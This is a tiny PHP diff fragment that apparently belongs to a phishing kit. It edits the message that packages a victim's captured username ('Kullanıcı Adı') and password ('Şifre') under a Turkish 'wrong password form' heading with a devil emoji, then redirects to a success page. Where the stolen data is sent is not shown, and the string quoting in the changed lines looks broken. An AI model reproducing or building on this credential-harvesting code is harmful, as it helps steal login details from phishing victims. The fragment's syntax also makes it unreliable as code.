@@ -17,7 +17,7 @@ header("location: success.php?id=$id");
 
 $data = [
   'text' => '➡️ Şifre yanliş formu 😈 
-  'text' => ➡️ sublime saplar izi kalır 😈
+             sublime saplar izi kalır 😈
 
 Kullanıcı Adı : '.$id.'
 Şifre : '.$pas.'
